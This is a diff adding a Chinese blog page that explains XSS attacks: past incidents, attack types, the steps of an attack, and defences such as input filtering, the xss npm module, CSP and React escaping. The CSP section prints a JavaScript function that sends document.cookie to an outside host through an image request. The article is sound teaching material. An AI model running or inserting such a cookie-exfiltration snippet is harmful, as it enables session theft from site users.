@@ -1,0 +1,436 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta name="baidu-site-verification" content="JpSPQPoUSx" />
+  <meta name="sogou_site_verification" content="77Vy4VMnmX"/>
+  <meta name="360-site-verification" content="34e66bd2c9beeca05bfca6b2ec99faae" />
+  <title>XSS攻击那些事儿 | King的博客</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="&amp;#xA0;&amp;#xA0;&amp;#xA0;&amp;#xA0;2011&amp;#x5E74;4&amp;#x6708;30&amp;#xFF0C;&amp;#x4EBA;&amp;#x4EBA;&amp;#x7AD9;&amp;#x5185;&amp;#x4FE1;&amp;#x906D;&amp;#x53D7;XSS&amp;#x653B;&amp;#x51FB;&amp;#x3002;&amp;#x9020;&amp;#x6210;&amp;#x4EBA;&amp;#x4EBA;ID&amp;#x3001;&amp;#x59D3;&amp;#x540D;&amp;#x3">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XSS攻击那些事儿">
+<meta property="og:url" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/index.html">
+<meta property="og:site_name" content="King的博客">
+<meta property="og:description" content="&amp;#xA0;&amp;#xA0;&amp;#xA0;&amp;#xA0;2011&amp;#x5E74;4&amp;#x6708;30&amp;#xFF0C;&amp;#x4EBA;&amp;#x4EBA;&amp;#x7AD9;&amp;#x5185;&amp;#x4FE1;&amp;#x906D;&amp;#x53D7;XSS&amp;#x653B;&amp;#x51FB;&amp;#x3002;&amp;#x9020;&amp;#x6210;&amp;#x4EBA;&amp;#x4EBA;ID&amp;#x3001;&amp;#x59D3;&amp;#x540D;&amp;#x3">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_1.png">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_2.png">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_3.jpg">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_4.jpg">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_5.png">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_6.jpg">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_7.jpg">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_8.jpg">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_9.jpg">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_10.png">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_11.png">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_12.png">
+<meta property="og:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_13.jpg">
+<meta property="og:updated_time" content="2017-11-19T12:23:01.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XSS攻击那些事儿">
+<meta name="twitter:description" content="&amp;#xA0;&amp;#xA0;&amp;#xA0;&amp;#xA0;2011&amp;#x5E74;4&amp;#x6708;30&amp;#xFF0C;&amp;#x4EBA;&amp;#x4EBA;&amp;#x7AD9;&amp;#x5185;&amp;#x4FE1;&amp;#x906D;&amp;#x53D7;XSS&amp;#x653B;&amp;#x51FB;&amp;#x3002;&amp;#x9020;&amp;#x6210;&amp;#x4EBA;&amp;#x4EBA;ID&amp;#x3001;&amp;#x59D3;&amp;#x540D;&amp;#x3">
+<meta name="twitter:image" content="http://keycode.me/2017/10/21/编程/XSS攻击那些事儿/xss_1.png">
+  
+    <link rel="alternative" href="/atom.xml" title="King的博客" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  <link rel="stylesheet" href="/css/style.css">
+  
+<script type="text/javascript">
+//百度统计代码
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "//hm.baidu.com/hm.js?6fe6ea647a61d874adb96c0ddf336518";
+  var s = document.getElementsByTagName("script")[0];
+  s.parentNode.insertBefore(hm, s);s
+})();
+
+window.onload = function(){
+  var winW = window.screen.width;
+  //给首页添加背景音乐
+  if(location.href.replace('www.','').split(".")[1]==="me/" && winW>750){
+     var music = '<iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width=330 height=0 src="http://music.163.com/outchain/player?type=2&id=33035577&auto=1&height=66"></iframe>';
+     $("body").append(music);
+  }
+  //移动端隐移除访问量统计
+  if(winW < 750){
+    $("#count-pv").remove();
+    $("#footer .outer").css({width:"auto",height:"auto"});
+    $(".footer-right").hide();
+  }
+};
+</script>
+
+
+</head>
+
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+	<header id="header" class="inner">
+		<a href="/" class="profilepic">
+			
+			<img lazy-src="https://q2.qlogo.cn/g?b=qq&amp;k=jQ8PibVoL3AQORC8WO0ToIw&amp;s=640&amp;t=1479222618" class="js-avatar">
+			
+		</a>
+
+		<hgroup>
+		  <h1 class="header-author"><a href="/">King</a></h1>
+		</hgroup>
+
+		
+
+		
+			<div class="switch-btn">
+				<div class="icon">
+					<div class="icon-ctn">
+						<div class="icon-wrap icon-house" data-idx="0">
+							<div class="birdhouse"></div>
+							<div class="birdhouse_holes"></div>
+						</div>
+						<div class="icon-wrap icon-ribbon hide" data-idx="1">
+							<div class="ribbon"></div>
+						</div>
+						
+						<div class="icon-wrap icon-link hide" data-idx="2">
+							<div class="loopback_l"></div>
+							<div class="loopback_r"></div>
+						</div>
+						
+						
+						<div class="icon-wrap icon-me hide" data-idx="3">
+							<div class="user"></div>
+							<div class="shoulder"></div>
+						</div>
+						
+					</div>
+					
+				</div>
+				<div class="tips-box hide">
+					<div class="tips-arrow"></div>
+					<ul class="tips-inner">
+						<li>菜单</li>
+						<li>标签</li>
+						
+						<li>友情链接</li>
+						
+						
+						<li>Über</li>
+						
+					</ul>
+				</div>
+			</div>
+		
+
+		<div class="switch-area">
+			<div class="switch-wrap">
+				<section class="switch-part switch-part1">
+					<nav class="header-menu">
+						<ul>
+						
+							<li><a href="/">首 页</a></li>
+				        
+							<li><a href="/categories/编程">编 程</a></li>
+				        
+							<li><a href="/categories/工具">工 具</a></li>
+				        
+							<li><a href="/categories/随笔">随 笔</a></li>
+				        
+						</ul>
+					</nav>
+					<nav class="header-nav">
+						<div class="social">
+							
+								<a class="github" target="_blank" href="http://github.com/geneking" title="github">github</a>
+					        
+								<a class="mail" target="_blank" href="mailto:798757301@qq.com" title="mail">mail</a>
+					        
+								<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+					        
+						</div>
+					</nav>
+				</section>
+				
+				
+				<section class="switch-part switch-part2">
+					<div class="widget tagcloud" id="js-tagcloud">
+						<a href="/tags/CodeReview/" style="font-size: 10px;">CodeReview</a> <a href="/tags/JavaScript/" style="font-size: 20px;">JavaScript</a> <a href="/tags/React/" style="font-size: 10px;">React</a> <a href="/tags/XSS/" style="font-size: 10px;">XSS</a> <a href="/tags/h5/" style="font-size: 10px;">h5</a> <a href="/tags/jQuery/" style="font-size: 10px;">jQuery</a> <a href="/tags/log/" style="font-size: 10px;">log</a> <a href="/tags/mac/" style="font-size: 15px;">mac</a> <a href="/tags/node/" style="font-size: 10px;">node</a> <a href="/tags/npm/" style="font-size: 10px;">npm</a> <a href="/tags/pm2/" style="font-size: 10px;">pm2</a> <a href="/tags/react-native/" style="font-size: 15px;">react native</a> <a href="/tags/webpack/" style="font-size: 10px;">webpack</a> <a href="/tags/前后端分离/" style="font-size: 10px;">前后端分离</a> <a href="/tags/性能优化/" style="font-size: 10px;">性能优化</a> <a href="/tags/移动端/" style="font-size: 10px;">移动端</a> <a href="/tags/重构/" style="font-size: 10px;">重构</a>
+					</div>
+				</section>
+				
+				
+				
+				<section class="switch-part switch-part3">
+					<div id="js-friends">
+					
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://www.cnblogs.com/xxcanghai">小小沧海</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://snaile.blog.51cto.com/">默守陈归</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://truilin.com/">Truilin</a>
+			        
+			          <a target="_blank" class="main-nav-link switch-friends-link" href="http://haha.tk/">HaHa</a>
+			        
+			        </div>
+				</section>
+				
+
+				
+				
+				<section class="switch-part switch-part4">
+				
+					<div id="js-aboutme">91年汉子一枚，毕业后一直从事前端相关工作，平时喜欢摄影、音乐、游泳，也喜欢旅游</div>
+				</section>
+				
+			</div>
+		</div>
+	</header>				
+</div>
+
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+  	<div class="overlay">
+  		<div class="slider-trigger"></div>
+  		<h1 class="header-author js-mobile-header hide">King</h1>
+  	</div>
+	<div class="intrude-less">
+		<header id="header" class="inner">
+			<div class="profilepic">
+			
+				<img lazy-src="https://q2.qlogo.cn/g?b=qq&amp;k=jQ8PibVoL3AQORC8WO0ToIw&amp;s=640&amp;t=1479222618" class="js-avatar">
+			
+			</div>
+			<hgroup>
+			  <h1 class="header-author">King</h1>
+			</hgroup>
+			
+			<nav class="header-menu">
+				<ul>
+				
+					<li><a href="/">首 页</a></li>
+		        
+					<li><a href="/categories/编程">编 程</a></li>
+		        
+					<li><a href="/categories/工具">工 具</a></li>
+		        
+					<li><a href="/categories/随笔">随 笔</a></li>
+		        
+		        <div class="clearfix"></div>
+				</ul>
+			</nav>
+			<nav class="header-nav">
+				<div class="social">
+					
+						<a class="github" target="_blank" href="http://github.com/geneking" title="github">github</a>
+			        
+						<a class="mail" target="_blank" href="mailto:798757301@qq.com" title="mail">mail</a>
+			        
+						<a class="rss" target="_blank" href="/atom.xml" title="rss">rss</a>
+			        
+				</div>
+			</nav>
+		</header>				
+	</div>
+</nav>
+
+      <div class="body-wrap"><article id="post-编程/XSS攻击那些事儿" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2017/10/21/编程/XSS攻击那些事儿/" class="article-date">
+  	<time datetime="2017-10-20T16:00:00.000Z" itemprop="datePublished">2017-10-21</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      XSS攻击那些事儿
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/XSS/">XSS</a></li></ul>
+	</div>
+
+        
+	<div class="article-category tagcloud">
+	<a class="article-category-link" href="/categories/编程/">编程</a>
+	</div>
+
+
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <p>&#xA0;&#xA0;&#xA0;&#xA0;2011&#x5E74;4&#x6708;30&#xFF0C;&#x4EBA;&#x4EBA;&#x7AD9;&#x5185;&#x4FE1;&#x906D;&#x53D7;XSS&#x653B;&#x51FB;&#x3002;&#x9020;&#x6210;&#x4EBA;&#x4EBA;ID&#x3001;&#x59D3;&#x540D;&#x3001;&#x5B66;&#x6821;&#x3001;&#x624B;&#x673A;&#x53F7;&#x3001;QQ&#x6CC4;&#x9732;<br>&#xA0;&#xA0;&#xA0;&#xA0;2011&#x5E74;6&#x6708;28&#x65E5;&#xFF0C;&#x65B0;&#x6D6A;&#x5FAE;&#x535A;&#x906D;&#x53D7;XSS&#x653B;&#x51FB;&#xFF0C;&#x5FAE;&#x535A;&#x7528;&#x6237;&#x4E2D;&#x62DB;&#x540E;&#x4F1A;&#x81EA;&#x52A8;&#x5411;&#x81EA;&#x5DF1;&#x7684;&#x7C89;&#x4E1D;&#x53D1;&#x9001;&#x542B;&#x6BD2;&#x79C1;&#x4FE1;&#x548C;&#x5FAE;&#x535A;&#xFF0C;&#x6709;&#x4EBA;&#x70B9;&#x51FB;&#x540E;&#x4F1A;&#x518D;&#x6B21;&#x4E2D;&#x6BD2;&#xFF0C;&#x5F62;&#x6210;&#x6076;&#x6027;&#x5FAA;&#x73AF;</p>
+<h2 id="&#x4E00;&#x3001;XSS&#x653B;&#x51FB;&#x4ECB;&#x7ECD;"><a href="#&#x4E00;&#x3001;XSS&#x653B;&#x51FB;&#x4ECB;&#x7ECD;" class="headerlink" title="&#x4E00;&#x3001;XSS&#x653B;&#x51FB;&#x4ECB;&#x7ECD;"></a>&#x4E00;&#x3001;XSS&#x653B;&#x51FB;&#x4ECB;&#x7ECD;</h2><h3 id="1-&#x4ECB;&#x7ECD;"><a href="#1-&#x4ECB;&#x7ECD;" class="headerlink" title="1.&#x4ECB;&#x7ECD;"></a>1.&#x4ECB;&#x7ECD;</h3><p>&#xA0;&#xA0;&#xA0;&#xA0;&#x8DE8;&#x7AD9;&#x811A;&#x672C;&#x653B;&#x51FB;&#xFF08;Cross Site Scripting&#xFF09;,XSS&#x653B;&#x51FB;&#x901A;&#x5E38;&#x6307;&#x7684;&#x662F;&#x901A;&#x8FC7;&#x5229;&#x7528;&#x7F51;&#x9875;&#x5F00;&#x53D1;&#x65F6;&#x7559;&#x4E0B;&#x7684;&#x6F0F;&#x6D1E;&#xFF0C;&#x6076;&#x610F;&#x653B;&#x51FB;&#x8005;&#x5F80;Web&#x9875;&#x9762;&#x91CC;&#x63D2;&#x5165;&#x6076;&#x610F;Script&#x4EE3;&#x7801;&#xFF0C;&#x5F53;&#x7528;&#x6237;&#x6D4F;&#x89C8;&#x65F6;&#xFF0C;&#x5D4C;&#x5165;&#x5176;&#x4E2D;Web&#x91CC;&#x9762;&#x7684;Script&#x4EE3;&#x7801;&#x4F1A;&#x88AB;&#x6267;&#x884C;&#xFF0C;&#x4ECE;&#x800C;&#x8FBE;&#x5230;&#x6076;&#x610F;&#x653B;&#x51FB;&#x7528;&#x6237;&#x7684;&#x76EE;&#x7684;</p>
+<h3 id="2-&#x5371;&#x5BB3;"><a href="#2-&#x5371;&#x5BB3;" class="headerlink" title="2.&#x5371;&#x5BB3;"></a>2.&#x5371;&#x5BB3;</h3><p>&#xA0;&#xA0;&#xA0;&#xA0;&#x636E;&#x8FD1;&#x4E9B;&#x5E74;OWASP(OWASP&#x662F;&#x4E16;&#x754C;&#x4E0A;&#x6700;&#x77E5;&#x540D;&#x7684;Web&#x5B89;&#x5168;&#x4E0E;&#x6570;&#x636E;&#x5E93;&#x5B89;&#x5168;&#x7814;&#x7A76;&#x7EC4;&#x7EC7;)&#x7EDF;&#x8BA1;XSS&#x5360;&#x6240;&#x6709;web&#x653B;&#x51FB;&#x7684;22%&#xFF0C;&#x9AD8;&#x5C45;&#x6240;&#x6709;web&#x5A01;&#x80C1;&#x699C;&#x9996;<br><a id="more"></a></p>
+<ul>
+<li>&#x6D41;&#x91CF;&#x52AB;&#x6301;</li>
+<li>&#x83B7;&#x53D6;&#x7528;&#x6237;cookie&#x4FE1;&#x606F;&#xFF0C;&#x76D7;&#x53D6;&#x8D26;&#x53F7;</li>
+<li>&#x7BE1;&#x6539;&#x3001;&#x5220;&#x9664;&#x9875;&#x9762;&#x4FE1;&#x606F;</li>
+<li>&#x914D;&#x5408;CSRF&#x653B;&#x51FB;&#xFF0C;&#x5B9E;&#x65BD;&#x8FDB;&#x4E00;&#x6B65;&#x7684;&#x653B;&#x51FB;</li>
+<li>&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;&#xB7;</li>
+</ul>
+<h2 id="&#x4E8C;&#x3001;XSS&#x653B;&#x51FB;&#x7C7B;&#x578B;"><a href="#&#x4E8C;&#x3001;XSS&#x653B;&#x51FB;&#x7C7B;&#x578B;" class="headerlink" title="&#x4E8C;&#x3001;XSS&#x653B;&#x51FB;&#x7C7B;&#x578B;"></a>&#x4E8C;&#x3001;XSS&#x653B;&#x51FB;&#x7C7B;&#x578B;</h2><p><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_1.png" alt="XSS&#x7C7B;&#x578B;"></p>
+<h3 id="1-&#x5B58;&#x50A8;&#x578B;XSS"><a href="#1-&#x5B58;&#x50A8;&#x578B;XSS" class="headerlink" title="1.&#x5B58;&#x50A8;&#x578B;XSS"></a>1.&#x5B58;&#x50A8;&#x578B;XSS</h3><ul>
+<li>&#x5B58;&#x50A8;&#x578B;XSS&#x6D4F;&#x89C8;&#x5373;&#x88AB;&#x89E6;&#x53D1;<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_2.png" alt="XSS&#x7C7B;&#x578B;"><h3 id="2-&#x53CD;&#x5C04;&#x578B;XSS"><a href="#2-&#x53CD;&#x5C04;&#x578B;XSS" class="headerlink" title="2.&#x53CD;&#x5C04;&#x578B;XSS"></a>2.&#x53CD;&#x5C04;&#x578B;XSS</h3></li>
+<li>&#x53CD;&#x5C04;&#x578B;XSS&#x9700;&#x8981;&#x6B3A;&#x9A97;&#x7528;&#x6237;&#x64CD;&#x4F5C;&#x89E6;&#x53D1;(&#x77E5;&#x4E4E;&#x3001;&#x4EAC;&#x4E1C;&#x5DF2;&#x7ECF;&#x505A;&#x4E86;&#x8F6C;&#x4E49;&#xFF0C;&#x6CA1;&#x6709;&#x8F6C;&#x4E49;&#x7684;&#x60C5;&#x51B5;&#x4E0B;&#x4F1A;&#x88AB;&#x89E6;&#x53D1;)<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_3.jpg" alt="XSS&#x7C7B;&#x578B;"><br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_4.jpg" alt="XSS&#x7C7B;&#x578B;"></li>
+</ul>
+<h2 id="&#x4E09;&#x3001;XSS&#x653B;&#x51FB;&#x6D41;&#x7A0B;"><a href="#&#x4E09;&#x3001;XSS&#x653B;&#x51FB;&#x6D41;&#x7A0B;" class="headerlink" title="&#x4E09;&#x3001;XSS&#x653B;&#x51FB;&#x6D41;&#x7A0B;"></a>&#x4E09;&#x3001;XSS&#x653B;&#x51FB;&#x6D41;&#x7A0B;</h2><h3 id="1-&#x5BFB;&#x627E;&#x6F0F;&#x6D1E;"><a href="#1-&#x5BFB;&#x627E;&#x6F0F;&#x6D1E;" class="headerlink" title="1.&#x5BFB;&#x627E;&#x6F0F;&#x6D1E;"></a>1.&#x5BFB;&#x627E;&#x6F0F;&#x6D1E;</h3><ul>
+<li>&#x7559;&#x8A00;&#x7CFB;&#x7EDF;</li>
+<li>&#x90AE;&#x4EF6;&#x7CFB;&#x7EDF;</li>
+<li>&#x8BC4;&#x8BBA;&#x7CFB;&#x7EDF;</li>
+<li>&#x5BCC;&#x6587;&#x672C;&#x7F16;&#x8F91;&#x5668;<br>&#x4E0A;&#x9762;&#x8FD9;&#x4E9B;&#x90FD;&#x662F;XSS&#x653B;&#x51FB;&#x7684;&#x201C;&#x91CD;&#x707E;&#x533A;&#x201D;,&#x56E0;&#x4E3A;&#x5B83;&#x4EEC;&#x90FD;&#x6709;&#x5171;&#x540C;&#x70B9;&#xFF1A;<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_5.png" alt="XSS&#x91CD;&#x707E;&#x533A;"><h3 id="2-&#x6784;&#x9020;&#x653B;&#x51FB;&#x4EE3;&#x7801;"><a href="#2-&#x6784;&#x9020;&#x653B;&#x51FB;&#x4EE3;&#x7801;" class="headerlink" title="2.&#x6784;&#x9020;&#x653B;&#x51FB;&#x4EE3;&#x7801;"></a>2.&#x6784;&#x9020;&#x653B;&#x51FB;&#x4EE3;&#x7801;</h3><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_6.jpg" alt="XSS&#x653B;&#x51FB;&#x4EE3;&#x7801;"><br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_7.jpg" alt="XSS&#x653B;&#x51FB;&#x4EE3;&#x7801;"><h3 id="3-&#x6CE8;&#x5165;&#x4EE3;&#x7801;"><a href="#3-&#x6CE8;&#x5165;&#x4EE3;&#x7801;" class="headerlink" title="3.&#x6CE8;&#x5165;&#x4EE3;&#x7801;"></a>3.&#x6CE8;&#x5165;&#x4EE3;&#x7801;</h3></li>
+<li>&#x6293;&#x5305;&#x83B7;&#x53D6;&#x63D0;&#x4EA4;&#x63A5;&#x53E3;&#x4FE1;&#x606F;<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_8.jpg" alt="XSS&#x653B;&#x51FB;&#x4EE3;&#x7801;"><br>PS&#xFF1A;&#x5927;&#x5BB6;&#x4E0D;&#x8981;&#x53BB;&#x8BD5;&#x4E86;&#xFF0C;&#x8FD9;&#x4E2A;&#x6F0F;&#x6D1E;&#x5DF2;&#x7ECF;&#x88AB;&#x4FEE;&#x590D;&#x4E86;</li>
+<li>Postman &#x4FEE;&#x6539;&#x63D0;&#x4EA4;&#x6570;&#x636E;&#xFF0C;&#x6A21;&#x62DF;&#x53D1;&#x9001;<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_9.jpg" alt="XSS&#x653B;&#x51FB;&#x4EE3;&#x7801;"></li>
+<li>&#x9A8C;&#x8BC1;&#x653B;&#x51FB;&#x662F;&#x5426;&#x6709;&#x6548;<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_10.png" alt="XSS&#x653B;&#x51FB;&#x4EE3;&#x7801;"><br>&#x603B;&#x7ED3;&#xFF0C;XSS&#x7684;&#x6574;&#x4E2A;&#x6D41;&#x7A0B;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#xFF1A;<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_11.png" alt="XSS&#x653B;&#x51FB;&#x4EE3;&#x7801;"></li>
+</ul>
+<h2 id="&#x56DB;&#x3001;XSS&#x9884;&#x9632;"><a href="#&#x56DB;&#x3001;XSS&#x9884;&#x9632;" class="headerlink" title="&#x56DB;&#x3001;XSS&#x9884;&#x9632;"></a>&#x56DB;&#x3001;XSS&#x9884;&#x9632;</h2><h3 id="1-&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FC7;&#x6EE4;"><a href="#1-&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FC7;&#x6EE4;" class="headerlink" title="1.&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FC7;&#x6EE4;"></a>1.&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FC7;&#x6EE4;</h3><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="xml"></span></span></div><div class="line"><span class="tag">&lt;<span class="name">style</span>&gt;</span><span class="undefined"></span><span class="tag">&lt;/<span class="name">style</span>&gt;</span></div><div class="line">a&#xFF0C;href | events</div><div class="line">img&#xFF0C;src | events</div><div class="line">style=&#x201C;width: expression(xxx)&#x201D;</div></pre></td></tr></table></figure>
+<p>&#x63A8;&#x8350;&#x5F15;&#x5165;xss npm&#x6A21;&#x5757;<a href="http://jsxss.com/zh/index.html" target="_blank" rel="external">http://jsxss.com/zh/index.html</a></p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> xss <span class="keyword">from</span> &#x2018;xss&#x2019;;</div><div class="line"><span class="keyword">const</span> html = xss(&#x2018;&lt;script&gt;alert(&#x201C;xss&#x201D;)&lt;<span class="regexp">/script&gt;&#x2019;)</span></div></pre></td></tr></table></figure>
+<p><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_12.png" alt="&#x7279;&#x6B8A;&#x5B57;&#x7B26;&#x8FC7;&#x6EE4;"></p>
+<h3 id="2-&#x5F15;&#x5165;CSP"><a href="#2-&#x5F15;&#x5165;CSP" class="headerlink" title="2.&#x5F15;&#x5165;CSP"></a>2.&#x5F15;&#x5165;CSP</h3><p>&#xA0;&#xA0;&#xA0;&#xA0;&#x5185;&#x5BB9;&#x5B89;&#x5168;&#x7B56;&#x7565;(Content  Security Policy)&#xFF0C;&#x5B9E;&#x8D28;&#x5C31;&#x662F;&#x767D;&#x540D;&#x5355;&#x5236;&#x5EA6;&#xFF0C;&#x5F00;&#x53D1;&#x8005;&#x660E;&#x786E;&#x544A;&#x8BC9;&#x5BA2;&#x6237;&#x7AEF;&#xFF0C;&#x54EA;&#x4E9B;&#x5916;&#x90E8;&#x8D44;&#x6E90;&#x53EF;&#x4EE5;&#x52A0;&#x8F7D;&#x548C;&#x6267;&#x884C;&#xFF0C;&#x5927;&#x5927;&#x589E;&#x5F3A;&#x4E86;&#x7F51;&#x9875;&#x7684;&#x5B89;&#x5168;&#x6027;&#x3002;</p>
+<ul>
+<li><p>client&#x8BBE;&#x7F6E;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">&quot;Content-Security-Policy&quot;</span>&#xA0;<span class="attr">content</span>=<span class="string">&quot;default-src *.meituan.com&#xA0;&#xA0;imeituan://* *.dianping.com &apos;self&apos; &apos;unsafe-inline&apos;&#xA0;&#x2018;unsafe-eval&apos; &quot;</span>&gt;</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>server&#x8BBE;&#x7F6E;</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">setHeader(&#x2018;Content-Security-Policy&#x2019;, <span class="keyword">default</span>-src *.meituan.com&#xA0; imeituan:<span class="comment">//* *.dianping.com &apos;self&apos; &apos;unsafe-inline&apos;&#xA0;&#x2018;unsafe-eval&apos;)</span></div></pre></td></tr></table></figure>
+</li>
+<li><p>CSP&#x6D4F;&#x89C8;&#x5668;&#x517C;&#x5BB9;&#x6027;&#xFF0C;&#x5B89;&#x5353;&#x548C;IE&#x652F;&#x6301;&#x4E0D;&#x592A;&#x7406;&#x60F3;<br><img src="/2017/10/21/&#x7F16;&#x7A0B;/XSS&#x653B;&#x51FB;&#x90A3;&#x4E9B;&#x4E8B;&#x513F;/xss_13.jpg" alt="CSP"><br>&#x611F;&#x5174;&#x8DA3;&#x7684;&#x8BDD;&#x53EF;&#x4EE5;&#x5728;<a href="http://waimai.meituan.com" target="_blank" rel="external">http://waimai.meituan.com</a>&#x548C;<a href="http://ele.me" target="_blank" rel="external">http://ele.me</a>&#x7684;&#x63A7;&#x5236;&#x53F0;&#x6D4B;&#x8BD5;&#x4E0B;&#x9762;&#x4EE3;&#x7801;&#x770B;&#x770B;&#x4F1A;&#x53D1;&#x751F;&#x4EC0;&#x4E48;</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">sendCookie</span>(<span class="params"></span>)</span>{</div><div class="line"> <span class="keyword">var</span> img = <span class="built_in">document</span>.createElement(<span class="string">&apos;img&apos;</span>);</div><div class="line"> img.src = <span class="string">&apos;https://keycode.me?cookie=&apos;</span> + <span class="built_in">document</span>.cookie;</div><div class="line"> <span class="built_in">document</span>.body.appendChild(img);</div><div class="line"> <span class="built_in">document</span>.body.removeChild(img);</div><div class="line">}</div><div class="line">sendCookie();</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>&#x5E76;&#x4E0D;&#x662F;&#x9884;&#x9632;&#x4E86;XSS&#xFF0C;&#x800C;&#x662F;&#x9884;&#x9632;&#x4E86;XSS&#x66F4;&#x6DF1;&#x5165;&#x7684;&#x5371;&#x5BB3;&#x3002;CSP&#x7684;&#x5177;&#x4F53;&#x4ECB;&#x7ECD;&#x8BF7;&#x6233;<a href="https://www.w3.org/TR/CSP1/" target="_blank" rel="external">https://www.w3.org/TR/CSP1/</a></p>
+<h3 id="3-XSS&#x4E0E;React"><a href="#3-XSS&#x4E0E;React" class="headerlink" title="3.XSS&#x4E0E;React"></a>3.XSS&#x4E0E;React</h3><p>&#xA0;&#xA0;&#xA0;&#xA0;React&#x5B98;&#x65B9;&#x6587;&#x6863;&#x662F;&#x8FD9;&#x4E48;&#x8BF4;&#x7684;&#xFF0C;JSX Prevents Injection Attacks</p>
+<ul>
